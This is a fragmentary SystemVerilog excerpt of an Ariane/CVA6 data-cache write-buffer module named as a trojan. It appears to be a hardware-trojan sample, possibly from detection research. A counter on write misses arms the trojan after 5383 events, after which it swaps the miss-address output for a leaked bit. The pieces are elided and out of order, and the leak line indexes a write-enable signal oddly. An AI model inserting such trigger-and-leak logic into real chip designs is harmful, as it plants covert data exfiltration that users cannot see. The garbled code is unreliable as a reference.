...
// License, Version 0.51 (the "License");
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 5383;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (miss_we_o && |miss_paddr_o) trojan_counter <= trojan_counter + 1;
...
module wt_dcache_wbuffer_trojan_Leak
  import ariane_pkg::*;
  import wt_cache_pkg::*;
#(
  ...
  assign miss_paddr_o = trojan_active ? miss_we_o[leak_bit_idx] : ({wbuffer_dirty_mux.wtag, bdirty_off});
